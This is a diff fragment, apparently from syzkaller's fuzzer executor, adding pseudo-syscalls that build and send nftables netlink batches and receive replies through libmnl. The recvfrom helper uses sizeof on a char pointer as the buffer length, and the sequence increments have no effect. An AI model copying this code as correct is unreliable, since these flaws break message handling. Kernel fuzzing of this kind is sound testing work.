+	nftnl_expr_set_str(lookup, NFTNL_EXPR_LOOKUP_SET, set_name);
+	nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_FLAGS, 0);
+
+	nftnl_rule_add_expr(rule, lookup);
+
+	struct nlmsghdr* nlh = nftnl_rule_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq);
+	nftnl_rule_nlmsg_build_payload(nlh, rule);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_rule_free(rule);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_recvfrom_cb
+#include <stdlib.h>
+static long syz_recvfrom_cb(volatile long nl_ptr, volatile long buf_ptr, volatile long portid, volatile long table_seq)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	char* buf = (char*)(long)buf_ptr;
+	int ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
+	while (ret > 0) {
+		ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL);
+		if (ret <= 0)
+			break;
+		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
+	}
+	if (ret == -1) {
+		perror("error");
+		return -1;
+	}
+	mnl_socket_close(nl);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_sendto
+static long syz_sendto(volatile long nl_ptr, volatile long batch_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_batch_begin
+static long syz_batch_begin(volatile long batch_ptr, volatile long seq)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_batch_end
+static long syz_batch_end(volatile long batch_ptr, volatile long seq)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+	return 0;
+}
 #endif
